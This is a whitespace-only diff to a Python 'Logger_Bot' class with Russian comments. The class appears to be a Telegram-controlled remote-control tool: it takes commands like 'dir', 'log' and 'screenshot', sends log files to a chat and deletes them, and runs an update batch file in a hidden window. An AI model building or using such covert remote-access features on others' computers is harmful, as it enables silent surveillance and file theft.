@@ -53,9 +53,9 @@ class Logger_Bot:
         self.path = '/storage/emulated/0/Git/logs/'
         day = 3
         if not os.path.exists(self.dump):
-        	os.mkdir(self.dump)
+            os.mkdir(self.dump)
         if not os.path.exists(self.path):
-        	os.mkdir(self.path)
+            os.mkdir(self.path)
         current, dirs, files = os.walk(self.path).__next__()
         if len(files) >= day:
             files = sorted(files)[:-3]
@@ -530,19 +530,19 @@ sh.Run "{pth}\\upd.bat", 0'''  # текст для скрипта обновы
             ctypes.c_uint(6),
             ctypes.byref(ctypes.c_uint())
         )
-	def loggs(self, dat):
-		namer = f'log_{dat}.txt'
-		answer = logger.get_log(namer)
-		try:
-			if answer:
-				f = open(answer,'rb')
-				bot.send_document(self.id, f)
-				f.close()
-				os.remove(answer)
-		except Exception as e:
-			logger.log(self.loggs.__name__, e)
- 	       bot.send_message(self.id, f'Ошибка: {e}')
-		
+    def loggs(self, dat):
+        namer = f'log_{dat}.txt'
+        answer = logger.get_log(namer)
+        try:
+            if answer:
+                f = open(answer,'rb')
+                bot.send_document(self.id, f)
+                f.close()
+                os.remove(answer)
+        except Exception as e:
+            logger.log(self.loggs.__name__, e)
+            bot.send_message(self.id, f'Ошибка: {e}')
+        
     def perfor(self, text, id_chat):  # главный обработчик
         try:
             self.id = id_chat
@@ -593,7 +593,7 @@ sh.Run "{pth}\\upd.bat", 0'''  # текст для скрипта обновы
 
                 if comnd == "dir" or comnd == "direction":
                     self.direct(text_comand[0])
-				if comnd == "log":
+                if comnd == "log":
                     self.loggs(text_comand[0])
                 if comnd == "screenshot" or comnd == "scrn":
                     self.screenshot()
